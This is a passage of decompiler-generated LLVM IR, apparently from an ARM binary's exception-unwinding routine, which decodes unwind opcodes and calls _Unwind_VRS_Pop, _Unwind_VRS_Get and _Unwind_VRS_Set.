  %v0_1a438 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a438 = load i32, i32* %r3.global-to-local, align 4
  %v4_1a438 = mul i32 %v1_1a438, 4096
  %v5_1a438 = or i32 %v4_1a438, %v0_1a438
  br label %dec_label_pc_1a43c

dec_label_pc_1a43c:                               ; preds = %dec_label_pc_1a3ec, %dec_label_pc_1a420
  %storemerge131 = phi i32 [ %v5_1a438, %dec_label_pc_1a420 ], [ 720897, %dec_label_pc_1a3ec ]
  store i32 %storemerge131, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a2bc

dec_label_pc_1a444:                               ; preds = %dec_label_pc_1a200
  %v0_1a444 = load i32, i32* @r5, align 4
  %v1_1a444 = add i32 %v0_1a444, 8
  %v2_1a444 = inttoptr i32 %v1_1a444 to i8*
  %v3_1a444 = load i8, i8* %v2_1a444, align 1
  %v4_1a444 = zext i8 %v3_1a444 to i32
  store i32 %v4_1a444, i32* %r3.global-to-local, align 4
  %v2_1a448 = icmp eq i8 %v3_1a444, 0
  store i1 %v2_1a448, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a448, label %dec_label_pc_1a458, label %.thread52

.thread52:                                        ; preds = %dec_label_pc_1a444
  %v2_1a44c = add nsw i32 %v4_1a444, -1
  store i32 %v2_1a44c, i32* %r3.global-to-local, align 4
  %v2_1a450 = trunc i32 %v2_1a44c to i8
  store i8 %v2_1a450, i8* %v2_1a444, align 1
  %v0_1a454.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a454.pr.pr, label %.thread52.dec_label_pc_1a458_crit_edge, label %dec_label_pc_1a48c

.thread52.dec_label_pc_1a458_crit_edge:           ; preds = %.thread52
  %v0_1a458.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a458

dec_label_pc_1a458:                               ; preds = %.thread52.dec_label_pc_1a458_crit_edge, %dec_label_pc_1a444
  %v2_1a470 = phi i32 [ %v0_1a458.pre, %.thread52.dec_label_pc_1a458_crit_edge ], [ %v0_1a444, %dec_label_pc_1a444 ]
  %v1_1a458 = add i32 %v2_1a470, 9
  %v2_1a458 = inttoptr i32 %v1_1a458 to i8*
  %v3_1a458 = load i8, i8* %v2_1a458, align 1
  %v4_1a458 = zext i8 %v3_1a458 to i32
  store i32 %v4_1a458, i32* %r3.global-to-local, align 4
  %v2_1a45c = icmp eq i8 %v3_1a458, 0
  store i1 %v2_1a45c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a45c, label %dec_label_pc_1a4a8, label %dec_label_pc_1a46c

dec_label_pc_1a46c:                               ; preds = %dec_label_pc_1a458
  %v1_1a46c = add nsw i32 %v4_1a458, -1
  store i32 %v1_1a46c, i32* %r3.global-to-local, align 4
  %v1_1a470 = trunc i32 %v1_1a46c to i8
  store i8 %v1_1a470, i8* %v2_1a458, align 1
  %v0_1a474 = load i32, i32* @r5, align 4
  %v1_1a474 = add i32 %v0_1a474, 4
  %v2_1a474 = inttoptr i32 %v1_1a474 to i32*
  %v3_1a474 = load i32, i32* %v2_1a474, align 4
  store i32 %v3_1a474, i32* %r2.global-to-local, align 4
  %v1_1a478 = inttoptr i32 %v3_1a474 to i32*
  %v2_1a478 = load i32, i32* %v1_1a478, align 4
  store i32 %v2_1a478, i32* %r0.global-to-local, align 4
  %v4_1a478 = add i32 %v3_1a474, 4
  store i32 %v4_1a478, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1a478, i32* %v2_1a474, align 4
  %v0_1a484 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a484 = trunc i32 %v0_1a484 to i8
  %v2_1a484 = load i32, i32* @r5, align 4
  %v3_1a484 = add i32 %v2_1a484, 8
  %v4_1a484 = inttoptr i32 %v3_1a484 to i8*
  store i8 %v1_1a484, i8* %v4_1a484, align 1
  %v0_1a488 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a488 = load i32, i32* @r5, align 4
  %v2_1a488 = inttoptr i32 %v1_1a488 to i32*
  store i32 %v0_1a488, i32* %v2_1a488, align 4
  br label %dec_label_pc_1a48c

dec_label_pc_1a48c:                               ; preds = %.thread52, %dec_label_pc_1a46c
  %v0_1a48c = load i32, i32* %r0.global-to-local, align 4
  %v3_1a48c = udiv i32 %v0_1a48c, 16777216
  %v1_1a490 = urem i32 %v3_1a48c, 16
  %v3_1a494 = mul i32 %v0_1a48c, 256
  store i32 %v3_1a494, i32* %r0.global-to-local, align 4
  %v1_1a498 = add nuw nsw i32 %v1_1a490, 1
  store i32 %v1_1a498, i32* %r2.global-to-local, align 4
  %v1_1a49c = and i32 %v3_1a48c, 240
  store i32 %v1_1a49c, i32* %r3.global-to-local, align 4
  %v1_1a4a0 = load i32, i32* @r5, align 4
  %v2_1a4a0 = inttoptr i32 %v1_1a4a0 to i32*
  store i32 %v3_1a494, i32* %v2_1a4a0, align 4
  %v0_1a4a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a4a4 = load i32, i32* %r3.global-to-local, align 4
  %v4_1a4a4 = mul i32 %v1_1a4a4, 4096
  %v5_1a4a4 = or i32 %v4_1a4a4, %v0_1a4a4
  br label %dec_label_pc_1a4a8

dec_label_pc_1a4a8:                               ; preds = %dec_label_pc_1a458, %dec_label_pc_1a48c
  %storemerge130 = phi i32 [ %v5_1a4a4, %dec_label_pc_1a48c ], [ 720897, %dec_label_pc_1a458 ]
  store i32 %storemerge130, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a2bc

dec_label_pc_1a4b0:                               ; preds = %dec_label_pc_1a1dc
  %v0_1a4b0 = load i32, i32* @r5, align 4
  %v1_1a4b0 = add i32 %v0_1a4b0, 8
  %v2_1a4b0 = inttoptr i32 %v1_1a4b0 to i8*
  %v3_1a4b0 = load i8, i8* %v2_1a4b0, align 1
  %v4_1a4b0 = zext i8 %v3_1a4b0 to i32
  store i32 %v4_1a4b0, i32* %r3.global-to-local, align 4
  %v2_1a4b4 = icmp eq i8 %v3_1a4b0, 0
  store i1 %v2_1a4b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a4b4, label %dec_label_pc_1a65c, label %.thread56

.thread56:                                        ; preds = %dec_label_pc_1a4b0
  %v2_1a4b8 = add nsw i32 %v4_1a4b0, -1
  store i32 %v2_1a4b8, i32* %r3.global-to-local, align 4
  %v2_1a4bc = trunc i32 %v2_1a4b8 to i8
  store i8 %v2_1a4bc, i8* %v2_1a4b0, align 1
  %v0_1a4c0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a4c0.pr.pr, label %.thread56.dec_label_pc_1a65c_crit_edge, label %dec_label_pc_1a4c4

.thread56.dec_label_pc_1a65c_crit_edge:           ; preds = %.thread56
  %v0_1a65c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a65c

dec_label_pc_1a4c4:                               ; preds = %.thread56, %dec_label_pc_1a668
  %v0_1a4c4 = load i32, i32* %r0.global-to-local, align 4
  %v3_1a4c4 = udiv i32 %v0_1a4c4, 16777216
  store i32 %v3_1a4c4, i32* %r3.global-to-local, align 4
  store i32 %v3_1a4c4, i32* %r2.global-to-local, align 4
  %tmp184 = icmp ult i32 %v0_1a4c4, 16777216
  store i1 %tmp184, i1* %cpsr_z.global-to-local, align 1
  %v3_1a4cc = mul i32 %v0_1a4c4, 256
  store i32 %v3_1a4cc, i32* %r0.global-to-local, align 4
  %v1_1a4d0 = load i32, i32* @r5, align 4
  %v2_1a4d0 = inttoptr i32 %v1_1a4d0 to i32*
  store i32 %v3_1a4cc, i32* %v2_1a4d0, align 4
  br i1 %tmp184, label %dec_label_pc_1a28c, label %dec_label_pc_1a4d8

dec_label_pc_1a4d8:                               ; preds = %dec_label_pc_1a4c4
  %v0_1a4d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a4d8 = and i32 %v0_1a4d8, 240
  store i32 %v1_1a4d8, i32* %r3.global-to-local, align 4
  %v2_1a4d8 = icmp eq i32 %v1_1a4d8, 0
  store i1 %v2_1a4d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a4d8, label %dec_label_pc_1a4e0, label %dec_label_pc_1a28c

dec_label_pc_1a4e0:                               ; preds = %dec_label_pc_1a4d8
  %v0_1a4e0 = load i32, i32* @r7, align 4
  store i32 %v0_1a4e0, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_1a4e8 = load i32, i32* %r2.global-to-local, align 4
  %v4_1a4e8 = call i32 @_Unwind_VRS_Pop(i32 %v0_1a4e0, i32 4, i32 %v2_1a4e8, i32 0)
  store i32 %v4_1a4e8, i32* %r0.global-to-local, align 4
  %v2_1a4ec = icmp eq i32 %v4_1a4e8, 0
  store i1 %v2_1a4ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a4ec, label %dec_label_pc_19fbc.backedge, label %dec_label_pc_1a4f4

dec_label_pc_1a4f4:                               ; preds = %dec_label_pc_1a4e0
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a0e4

dec_label_pc_1a4fc:                               ; preds = %dec_label_pc_1a328
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1a508 = load i32, i32* @r7, align 4
  store i32 %v0_1a508, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v5_1a514 = call i32 @_Unwind_VRS_Get(i32 %v0_1a508, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1a514, i32* %r0.global-to-local, align 4
  %v0_1a518 = load i32, i32* @r5, align 4
  %v1_1a518 = add i32 %v0_1a518, 8
  %v2_1a518 = inttoptr i32 %v1_1a518 to i8*
  %v3_1a518 = load i8, i8* %v2_1a518, align 1
  %v4_1a518 = zext i8 %v3_1a518 to i32
  store i32 %v4_1a518, i32* %r1.global-to-local, align 4
  %v2_1a51c = icmp eq i8 %v3_1a518, 0
  store i1 %v2_1a51c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a51c, label %dec_label_pc_1a52c, label %.thread58

.thread58:                                        ; preds = %dec_label_pc_1a4fc
  %v2_1a520 = add nsw i32 %v4_1a518, -1
  store i32 %v2_1a520, i32* %r3.global-to-local, align 4
  %v2_1a524 = trunc i32 %v2_1a520 to i8
  store i8 %v2_1a524, i8* %v2_1a518, align 1
  %v0_1a528.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a528.pr.pr, label %.thread58.dec_label_pc_1a52c_crit_edge, label %dec_label_pc_1a558

.thread58.dec_label_pc_1a52c_crit_edge:           ; preds = %.thread58
  %v0_1a52c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a52c

dec_label_pc_1a52c:                               ; preds = %.thread58.dec_label_pc_1a52c_crit_edge, %dec_label_pc_1a4fc
  %v2_1a540 = phi i32 [ %v0_1a52c.pre, %.thread58.dec_label_pc_1a52c_crit_edge ], [ %v0_1a518, %dec_label_pc_1a4fc ]
  %v1_1a52c = add i32 %v2_1a540, 9
  %v2_1a52c = inttoptr i32 %v1_1a52c to i8*
  %v3_1a52c = load i8, i8* %v2_1a52c, align 1
  %v4_1a52c = zext i8 %v3_1a52c to i32
  store i32 %v4_1a52c, i32* %r3.global-to-local, align 4
  %v2_1a530 = icmp eq i8 %v3_1a52c, 0
  store i1 %v2_1a530, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a530, label %bb158, label %dec_label_pc_1a53c

bb158:                                            ; preds = %dec_label_pc_1a52c
  %v1_1a534 = load i32, i32* @r6, align 4
  store i32 %v1_1a534, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a580

dec_label_pc_1a53c:                               ; preds = %dec_label_pc_1a52c
  %v1_1a53c = add nsw i32 %v4_1a52c, -1
  store i32 %v1_1a53c, i32* %r3.global-to-local, align 4
  %v1_1a540 = trunc i32 %v1_1a53c to i8
  store i8 %v1_1a540, i8* %v2_1a52c, align 1
  %v0_1a544 = load i32, i32* @r5, align 4
  %v1_1a544 = add i32 %v0_1a544, 4
  %v2_1a544 = inttoptr i32 %v1_1a544 to i32*
  %v3_1a544 = load i32, i32* %v2_1a544, align 4
  store i32 %v3_1a544, i32* %r2.global-to-local, align 4
  %v1_1a548 = inttoptr i32 %v3_1a544 to i32*
  %v2_1a548 = load i32, i32* %v1_1a548, align 4
  store i32 %v2_1a548, i32* %r0.global-to-local, align 4
  %v4_1a548 = add i32 %v3_1a544, 4
  store i32 %v4_1a548, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_1a550 = inttoptr i32 %v0_1a544 to i32*
  store i32 %v2_1a548, i32* %v1_1a550, align 4
  %v5_1a550 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_1a550, i32* %v2_1a544, align 4
  %v0_1a554 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a554 = trunc i32 %v0_1a554 to i8
  %v2_1a554 = load i32, i32* @r5, align 4
  %v3_1a554 = add i32 %v2_1a554, 8
  %v4_1a554 = inttoptr i32 %v3_1a554 to i8*
  store i8 %v1_1a554, i8* %v4_1a554, align 1
  br label %dec_label_pc_1a558

dec_label_pc_1a558:                               ; preds = %.thread58, %dec_label_pc_1a53c
  %v0_1a558 = load i32, i32* @r5, align 4
  %v1_1a558 = inttoptr i32 %v0_1a558 to i32*
  %v2_1a558 = load i32, i32* %v1_1a558, align 4
  store i32 %v2_1a558, i32* %r3.global-to-local, align 4
  %v3_1a55c = mul i32 %v2_1a558, 256
  store i32 %v3_1a55c, i32* %r0.global-to-local, align 4
  %v3_1a560 = udiv i32 %v2_1a558, 16777216
  store i32 %v3_1a560, i32* %r2.global-to-local, align 4
  store i32 %v3_1a55c, i32* %v1_1a558, align 4
  %v0_1a568 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a568 = and i32 %v0_1a568, 128
  %v2_1a568 = icmp eq i32 %v1_1a568, 0
  store i1 %v2_1a568, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a568, label %.thread129, label %dec_label_pc_1a57c

.thread129:                                       ; preds = %dec_label_pc_1a558
  %v4_1a56c = load i32, i32* %stack_var_-36, align 4
  store i32 %v4_1a56c, i32* %ip.global-to-local, align 4
  %v1_1a570 = urem i32 %v0_1a568, 256
  store i32 %v1_1a570, i32* %r2.global-to-local, align 4
  store i32 2, i32* @lr, align 4
  br label %dec_label_pc_1a5f0

dec_label_pc_1a57c:                               ; preds = %dec_label_pc_1a558
  %v1_1a57063 = urem i32 %v0_1a568, 256
  store i32 %v1_1a57063, i32* %r2.global-to-local, align 4
  %v0_1a57c = load i32, i32* @r5, align 4
  %v1_1a57c = add i32 %v0_1a57c, 8
  %v2_1a57c = inttoptr i32 %v1_1a57c to i8*
  %v3_1a57c = load i8, i8* %v2_1a57c, align 1
  %v4_1a57c = zext i8 %v3_1a57c to i32
  store i32 %v4_1a57c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a580

dec_label_pc_1a580:                               ; preds = %bb158, %dec_label_pc_1a57c
  %v3_1a5a099 = phi i32 [ %v2_1a540, %bb158 ], [ %v0_1a57c, %dec_label_pc_1a57c ]
  %v0_1a58892 = phi i32 [ %v1_1a534, %bb158 ], [ %v1_1a57063, %dec_label_pc_1a57c ]
  %v3_1a580 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_1a580, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1a588

dec_label_pc_1a588:                               ; preds = %dec_label_pc_1a588.backedge, %dec_label_pc_1a580
  %v3_1a5a0 = phi i32 [ %v3_1a5a0100, %dec_label_pc_1a588.backedge ], [ %v3_1a5a099, %dec_label_pc_1a580 ]
  %v0_1a59c = phi i32 [ %v2_1a58c.pre, %dec_label_pc_1a588.backedge ], [ 2, %dec_label_pc_1a580 ]
  %v0_1a58c = phi i32 [ %v0_1a58c.pre, %dec_label_pc_1a588.backedge ], [ %v3_1a580, %dec_label_pc_1a580 ]
  %v0_1a588 = phi i32 [ %v0_1a58895, %dec_label_pc_1a588.backedge ], [ %v0_1a58892, %dec_label_pc_1a580 ]
  %v1_1a588 = urem i32 %v0_1a588, 128
  %v7_1a58c = shl i32 %v1_1a588, %v0_1a59c
  %v8_1a58c = add i32 %v7_1a58c, %v0_1a58c
  store i32 %v8_1a58c, i32* %ip.global-to-local, align 4
  %v0_1a590 = load i32, i32* %r1.global-to-local, align 4
  %v2_1a590 = icmp eq i32 %v0_1a590, 0
  store i1 %v2_1a590, i1* %cpsr_z.global-to-local, align 1
  %v1_1a594 = add i32 %v0_1a590, -1
  store i32 %v1_1a594, i32* %r3.global-to-local, align 4
  store i32 %v8_1a58c, i32* %stack_var_-36, align 4
  %v1_1a59c = add i32 %v0_1a59c, 7
  store i32 %v1_1a59c, i32* @lr, align 4
  br i1 %v2_1a590, label %dec_label_pc_1a5a8, label %bb159

bb159:                                            ; preds = %dec_label_pc_1a588
  %v2_1a5a0 = trunc i32 %v1_1a594 to i8
  %v4_1a5a0 = add i32 %v3_1a5a0, 8
  %v5_1a5a0 = inttoptr i32 %v4_1a5a0 to i8*
  store i8 %v2_1a5a0, i8* %v5_1a5a0, align 1
  %v0_1a5a4.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a5a4.pr, label %.dec_label_pc_1a5a8_crit_edge, label %dec_label_pc_1a5d4

.dec_label_pc_1a5a8_crit_edge:                    ; preds = %bb159
  %v0_1a5a8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a5a8

dec_label_pc_1a5a8:                               ; preds = %.dec_label_pc_1a5a8_crit_edge, %dec_label_pc_1a588
  %v2_1a5c0 = phi i32 [ %v0_1a5a8.pre, %.dec_label_pc_1a5a8_crit_edge ], [ %v3_1a5a0, %dec_label_pc_1a588 ]
  %v1_1a5a8 = add i32 %v2_1a5c0, 9
  %v2_1a5a8 = inttoptr i32 %v1_1a5a8 to i8*
  %v3_1a5a8 = load i8, i8* %v2_1a5a8, align 1
  %v4_1a5a8 = zext i8 %v3_1a5a8 to i32
  store i32 %v4_1a5a8, i32* %r3.global-to-local, align 4
  %v2_1a5ac = icmp eq i8 %v3_1a5a8, 0
  store i1 %v2_1a5ac, i1* %cpsr_z.global-to-local, align 1
  %v1_1a5b0 = add nsw i32 %v4_1a5a8, -1
  store i32 %v1_1a5b0, i32* %r0.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  br i1 %v2_1a5ac, label %dec_label_pc_1a588.backedge, label %dec_label_pc_1a5bc

dec_label_pc_1a5bc:                               ; preds = %dec_label_pc_1a5a8
  %v1_1a5bc = add i32 %v2_1a5c0, 4
  %v2_1a5bc = inttoptr i32 %v1_1a5bc to i32*
  %v3_1a5bc = load i32, i32* %v2_1a5bc, align 4
  store i32 %v3_1a5bc, i32* %r2.global-to-local, align 4
  %v1_1a5c0 = trunc i32 %v1_1a5b0 to i8
  store i8 %v1_1a5c0, i8* %v2_1a5a8, align 1
  %v0_1a5c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a5c4 = inttoptr i32 %v0_1a5c4 to i32*
  %v2_1a5c4 = load i32, i32* %v1_1a5c4, align 4
  store i32 %v2_1a5c4, i32* %r0.global-to-local, align 4
  %v4_1a5c4 = add i32 %v0_1a5c4, 4
  store i32 %v4_1a5c4, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v2_1a5cc = load i32, i32* @r5, align 4
  %v3_1a5cc = add i32 %v2_1a5cc, 8
  %v4_1a5cc = inttoptr i32 %v3_1a5cc to i8*
  store i8 3, i8* %v4_1a5cc, align 1
  %v0_1a5d0 = load i32, i32* @r5, align 4
  %v1_1a5d0 = inttoptr i32 %v0_1a5d0 to i32*
  %v2_1a5d0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_1a5d0, i32* %v1_1a5d0, align 4
  %v3_1a5d0 = add i32 %v0_1a5d0, 4
  %v4_1a5d0 = inttoptr i32 %v3_1a5d0 to i32*
  %v5_1a5d0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_1a5d0, i32* %v4_1a5d0, align 4
  br label %dec_label_pc_1a5d4

dec_label_pc_1a5d4:                               ; preds = %bb159, %dec_label_pc_1a5bc
  %v0_1a5d4 = load i32, i32* @r5, align 4
  %v1_1a5d4 = inttoptr i32 %v0_1a5d4 to i32*
  %v2_1a5d4 = load i32, i32* %v1_1a5d4, align 4
  store i32 %v2_1a5d4, i32* %r3.global-to-local, align 4
  %v3_1a5d8 = udiv i32 %v2_1a5d4, 16777216
  store i32 %v3_1a5d8, i32* %r2.global-to-local, align 4
  %v1_1a5dc = and i32 %v3_1a5d8, 128
  %v2_1a5dc = icmp eq i32 %v1_1a5dc, 0
  store i1 %v2_1a5dc, i1* %cpsr_z.global-to-local, align 1
  %v3_1a5e0 = mul i32 %v2_1a5d4, 256
  store i32 %v3_1a5e0, i32* %r0.global-to-local, align 4
  store i32 %v3_1a5e0, i32* %v1_1a5d4, align 4
  %v0_1a5e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a5e8 = urem i32 %v0_1a5e8, 256
  store i32 %v1_1a5e8, i32* %r2.global-to-local, align 4
  br i1 %v2_1a5dc, label %dec_label_pc_1a5f0.loopexit, label %dec_label_pc_1a61c

dec_label_pc_1a5f0.loopexit:                      ; preds = %dec_label_pc_1a5d4
  %v0_1a5f4.pre = load i32, i32* %ip.global-to-local, align 4
  %v2_1a5f8.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_1a5f0

dec_label_pc_1a5f0:                               ; preds = %dec_label_pc_1a5f0.loopexit, %.thread129
  %v2_1a5f8 = phi i32 [ 2, %.thread129 ], [ %v2_1a5f8.pre, %dec_label_pc_1a5f0.loopexit ]
  %v0_1a5f4 = phi i32 [ %v4_1a56c, %.thread129 ], [ %v0_1a5f4.pre, %dec_label_pc_1a5f0.loopexit ]
  %v0_1a5f0 = phi i32 [ %v1_1a570, %.thread129 ], [ %v1_1a5e8, %dec_label_pc_1a5f0.loopexit ]
  %v1_1a5f0 = urem i32 %v0_1a5f0, 128
  %v1_1a5f4 = add i32 %v0_1a5f4, 516
  %v7_1a5f8 = shl i32 %v1_1a5f0, %v2_1a5f8
  %v8_1a5f8 = add i32 %v1_1a5f4, %v7_1a5f8
  store i32 %v8_1a5f8, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_1a600 = load i32, i32* @r7, align 4
  store i32 %v0_1a600, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v8_1a5f8, i32* %stack_var_-36, align 4
  %v5_1a614 = call i32 @_Unwind_VRS_Set(i32 %v0_1a600, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1a614, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19fbc.backedge

dec_label_pc_1a61c:                               ; preds = %dec_label_pc_1a5d4
  %v0_1a61c = load i32, i32* @r5, align 4
  %v1_1a61c = add i32 %v0_1a61c, 8
  %v2_1a61c = inttoptr i32 %v1_1a61c to i8*
  %v3_1a61c = load i8, i8* %v2_1a61c, align 1
  %v4_1a61c = zext i8 %v3_1a61c to i32
  store i32 %v4_1a61c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a588.backedge

dec_label_pc_1a588.backedge:                      ; preds = %dec_label_pc_1a61c, %dec_label_pc_1a5a8
  %v3_1a5a0100 = phi i32 [ %v0_1a61c, %dec_label_pc_1a61c ], [ %v2_1a5c0, %dec_label_pc_1a5a8 ]
  %v0_1a58895 = phi i32 [ %v1_1a5e8, %dec_label_pc_1a61c ], [ 176, %dec_label_pc_1a5a8 ]
  %v0_1a58c.pre = load i32, i32* %ip.global-to-local, align 4
  %v2_1a58c.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_1a588

dec_label_pc_1a624:                               ; preds = %dec_label_pc_1a320
  %v0_1a624 = load i32, i32* @r5, align 4
  %v1_1a624 = add i32 %v0_1a624, 8
  %v2_1a624 = inttoptr i32 %v1_1a624 to i8*
  %v3_1a624 = load i8, i8* %v2_1a624, align 1
  %v4_1a624 = zext i8 %v3_1a624 to i32
  store i32 %v4_1a624, i32* %r3.global-to-local, align 4
  %v2_1a628 = icmp eq i8 %v3_1a624, 0
  store i1 %v2_1a628, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a628, label %dec_label_pc_1a68c, label %.thread66

.thread66:                                        ; preds = %dec_label_pc_1a624
  %v2_1a62c = add nsw i32 %v4_1a624, -1
  store i32 %v2_1a62c, i32* %r3.global-to-local, align 4
  %v2_1a630 = trunc i32 %v2_1a62c to i8
  store i8 %v2_1a630, i8* %v2_1a624, align 1
  %v0_1a634.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a634.pr.pr, label %.thread66.dec_label_pc_1a68c_crit_edge, label %dec_label_pc_1a638

.thread66.dec_label_pc_1a68c_crit_edge:           ; preds = %.thread66
  %v0_1a68c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a68c

dec_label_pc_1a638:                               ; preds = %.thread66, %dec_label_pc_1a698
  %v0_1a638 = load i32, i32* %r0.global-to-local, align 4
  %v3_1a638 = udiv i32 %v0_1a638, 16777216
  store i32 %v3_1a638, i32* %r3.global-to-local, align 4
  store i32 %v3_1a638, i32* %r2.global-to-local, align 4
  %tmp185 = icmp ult i32 %v0_1a638, 16777216
  store i1 %tmp185, i1* %cpsr_z.global-to-local, align 1
  %v3_1a640 = mul i32 %v0_1a638, 256
  store i32 %v3_1a640, i32* %r0.global-to-local, align 4
  %v1_1a644 = load i32, i32* @r5, align 4
  %v2_1a644 = inttoptr i32 %v1_1a644 to i32*
  store i32 %v3_1a640, i32* %v2_1a644, align 4
  br i1 %tmp185, label %dec_label_pc_1a28c, label %dec_label_pc_1a64c

dec_label_pc_1a64c:                               ; preds = %dec_label_pc_1a638
  %v0_1a64c = load i32, i32* %r3.global-to-local, align 4
  %v1_1a64c = and i32 %v0_1a64c, 240
  store i32 %v1_1a64c, i32* %r1.global-to-local, align 4
  %v2_1a64c = icmp eq i32 %v1_1a64c, 0
  store i1 %v2_1a64c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a64c, label %dec_label_pc_1a64c.dec_label_pc_1a2bc_crit_edge, label %dec_label_pc_1a654

dec_label_pc_1a64c.dec_label_pc_1a2bc_crit_edge:  ; preds = %dec_label_pc_1a64c
  %v2_1a2c4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a2bc

dec_label_pc_1a654:                               ; preds = %dec_label_pc_1a64c
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a0e4

dec_label_pc_1a65c:                               ; preds = %.thread56.dec_label_pc_1a65c_crit_edge, %dec_label_pc_1a4b0
  %v2_1a66c = phi i32 [ %v0_1a65c.pre, %.thread56.dec_label_pc_1a65c_crit_edge ], [ %v0_1a4b0, %dec_label_pc_1a4b0 ]
  %v1_1a65c = add i32 %v2_1a66c, 9
  %v2_1a65c = inttoptr i32 %v1_1a65c to i8*
  %v3_1a65c = load i8, i8* %v2_1a65c, align 1
  %v4_1a65c = zext i8 %v3_1a65c to i32
  store i32 %v4_1a65c, i32* %r3.global-to-local, align 4
  %v2_1a660 = icmp eq i8 %v3_1a65c, 0
  store i1 %v2_1a660, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a660, label %dec_label_pc_1a28c, label %dec_label_pc_1a668

dec_label_pc_1a668:                               ; preds = %dec_label_pc_1a65c
  %v1_1a668 = add nsw i32 %v4_1a65c, -1
  store i32 %v1_1a668, i32* %r3.global-to-local, align 4
  %v1_1a66c = trunc i32 %v1_1a668 to i8
  store i8 %v1_1a66c, i8* %v2_1a65c, align 1
  %v0_1a670 = load i32, i32* @r5, align 4
  %v1_1a670 = add i32 %v0_1a670, 4
  %v2_1a670 = inttoptr i32 %v1_1a670 to i32*
  %v3_1a670 = load i32, i32* %v2_1a670, align 4
  store i32 %v3_1a670, i32* %r2.global-to-local, align 4
  %v1_1a674 = inttoptr i32 %v3_1a670 to i32*
  %v2_1a674 = load i32, i32* %v1_1a674, align 4
  store i32 %v2_1a674, i32* %r0.global-to-local, align 4
  %v4_1a674 = add i32 %v3_1a670, 4
  store i32 %v4_1a674, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1a674, i32* %v2_1a670, align 4
  %v0_1a680 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a680 = trunc i32 %v0_1a680 to i8
  %v2_1a680 = load i32, i32* @r5, align 4
  %v3_1a680 = add i32 %v2_1a680, 8
  %v4_1a680 = inttoptr i32 %v3_1a680 to i8*
  store i8 %v1_1a680, i8* %v4_1a680, align 1
  %v0_1a684 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a684 = load i32, i32* @r5, align 4
  %v2_1a684 = inttoptr i32 %v1_1a684 to i32*
  store i32 %v0_1a684, i32* %v2_1a684, align 4
  br label %dec_label_pc_1a4c4

dec_label_pc_1a68c:                               ; preds = %.thread66.dec_label_pc_1a68c_crit_edge, %dec_label_pc_1a624
  %v2_1a69c = phi i32 [ %v0_1a68c.pre, %.thread66.dec_label_pc_1a68c_crit_edge ], [ %v0_1a624, %dec_label_pc_1a624 ]
  %v1_1a68c = add i32 %v2_1a69c, 9
  %v2_1a68c = inttoptr i32 %v1_1a68c to i8*
  %v3_1a68c = load i8, i8* %v2_1a68c, align 1
